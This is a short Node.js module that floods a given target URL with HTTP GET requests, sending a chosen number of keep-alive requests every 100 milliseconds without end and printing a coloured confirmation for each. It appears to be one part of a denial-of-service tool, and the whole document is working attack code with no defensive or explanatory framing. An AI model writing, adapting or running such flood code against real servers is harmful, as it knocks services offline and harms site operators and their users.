const http = require('http');
const chalk = require('chalk');

module.exports = function(target, threads) {
  const { hostname, pathname } = new URL(target);

  setInterval(() => {
    for (let i = 0; i < threads; i++) {
      const req = http.request({
        host: hostname,
        path: pathname,
        method: 'GET',
        headers: { Connection: 'keep-alive' }
      });

      req.end();
      console.log(chalk.cyan(`[✓] Keep-Alive sent`));
    }
  }, 100);
};